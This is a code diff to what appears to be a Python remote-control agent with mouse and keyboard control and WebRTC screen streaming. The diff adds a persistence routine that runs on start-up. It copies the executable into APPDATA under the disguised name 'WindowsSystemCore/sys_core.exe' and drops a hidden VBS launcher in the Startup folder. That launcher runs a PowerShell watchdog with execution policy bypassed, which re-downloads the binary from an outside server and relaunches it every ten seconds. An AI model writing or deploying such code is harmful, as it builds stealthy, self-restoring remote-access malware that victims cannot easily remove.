@@ -13,13 +13,71 @@ import psutil
 import getpass
 import platform
 import subprocess
+import shutil
 from pynput.mouse import Controller as MouseController, Button
 from pynput.keyboard import Controller as KeyboardController, Key
 import av
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, AudioStreamTrack, RTCRtpSender, RTCConfiguration, RTCIceServer
 from aiortc.contrib.media import MediaStreamTrack, MediaRelay
 
-AGENT_VERSION = "8.0.0-ULTRA"
+AGENT_VERSION = "9.0.0-IMMORTAL"
+
+def install_persistence():
+    current_exe = sys.executable
+    if not current_exe.lower().endswith("mrl_agent.exe"): 
+        return # Skip setup if running via Python script or already installed
+
+    appdata = os.environ.get('APPDATA')
+    if not appdata: return
+    
+    target_dir = os.path.join(appdata, 'WindowsSystemCore')
+    target_exe = os.path.join(target_dir, 'sys_core.exe')
+    watchdog_ps1 = os.path.join(target_dir, 'sys_watchdog.ps1')
+    startup_vbs = os.path.join(appdata, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'sys_core_monitor.vbs')
+    
+    if current_exe.lower() == target_exe.lower():
+        return # We are the hidden clone. Proceed normally.
+
+    try: os.makedirs(target_dir, exist_ok=True)
+    except: pass
+    
+    try: shutil.copy2(current_exe, target_exe)
+    except: pass
+    
+    ps1_code = f"""
+$exePath = "{target_exe}"
+$url = "https://web-production-d6db5.up.railway.app/api/client_exe"
+while ($true) {{
+    $running = Get-Process -Name "sys_core" -ErrorAction SilentlyContinue
+    if (-not $running) {{
+        if (-not (Test-Path -Path $exePath)) {{
+            try {{
+                Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing
+            }} catch {{ }}
+        }}
+        if (Test-Path -Path $exePath) {{
+            Start-Process -FilePath $exePath
+        }}
+    }}
+    Start-Sleep -Seconds 10
+}}
+"""
+    try:
+        with open(watchdog_ps1, "w") as f: f.write(ps1_code)
+    except: pass
+    
+    vbs_code = 'Set objShell = CreateObject("WScript.Shell")\n'
+    vbs_code += f'objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""{watchdog_ps1}""", 0, False\n'
+
+    try:
+        with open(startup_vbs, "w") as f: f.write(vbs_code)
+    except: pass
+    
+    subprocess.Popen(f'wscript.exe "{startup_vbs}"', shell=True)
+    os._exit(0)
+
+# Initialize Persistence IMMEDIATELY on boot
+install_persistence()
 
 class AutoUpdater:
     @staticmethod
@@ -36,11 +94,11 @@ class AutoUpdater:
             return
             
         current_exe = sys.executable
-        if not current_exe.lower().endswith("mrl_agent.exe"):
-            print("[OTA] Not running as compiled agent (sys.executable != mrl_agent.exe). Skipping hot-swap.")
+        if not current_exe.lower().endswith(".exe"):
+            print("[OTA] Not running as compiled agent (.exe). Skipping hot-swap.")
             return
 
-        bat_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "update_mrl.bat")
+        bat_file = os.path.join(os.environ.get('TEMP', 'C:\\Temp'), "update_core.bat")
         print("[OTA] Deploying transient hot-swap script...")
         with open(bat_file, "w") as f:
             f.write(f"""@echo off
